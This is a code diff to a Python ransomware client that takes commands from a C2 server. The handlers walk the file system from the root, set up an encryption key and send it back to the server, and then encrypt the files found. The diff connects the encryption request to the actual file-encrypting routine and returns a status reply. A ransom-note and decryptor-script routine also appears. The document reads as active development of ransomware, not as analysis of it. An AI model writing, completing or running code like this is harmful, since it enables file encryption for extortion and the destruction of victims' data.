@@ -152,11 +152,12 @@ class Program():
     def __encrypt(self):
         if self.__criptography is None:
             print("Cryptography not set up. Please run 'setup' first.")
-            return
+            return False
 
         print("Encrypting files...")
         for file in self.__found_files:
             self.__criptography.encrypt(file)
+        return True
 
     def __ransomnote(self):
         print("Creating ransom notes and decryptor scripts...")
@@ -318,6 +319,7 @@ class Program():
             case "set_id":
                 self.__id = message.get("data", {}).get("id", "")
                 print("ID SET", self.__id)
+                return None
             case "discovery_req":
                 print("Discovery request received from C2 server.")
                 self.__directory(start_path=message_data.get("initial_directory", "/"))
@@ -326,7 +328,6 @@ class Program():
                     "files_found": len(self.__found_files),
                     "directories": len(self.__directories_with_files)
                 }
-                return message_reply
             case "crypto_req":
                 print("Cryptographic setup request received from C2 server.")
                 self.__setup(
@@ -340,11 +341,13 @@ class Program():
                     "key": self.__criptography.key.decode()
                 }
 
-                return message_reply
-
             case "encryption_req":
                 print("Encryption request received from C2 server.")
-                pass
+                result = self.__encrypt()
+                message_reply["type"] = "encryption_rep"
+                message_reply["data"] = {"total_time": 1 if result else -1}
+                return message_reply
+            
             case "ransomnote_req":
                 print("Ransom note request received from C2 server.")
                 pass
@@ -356,7 +359,8 @@ class Program():
                 pass
             case _:
                 print(f"Unknown message type from C2 server: {message.get('type')}")
-        return None
+                return None
+        return message_reply
         
 
     async def send_decryption_request(self):
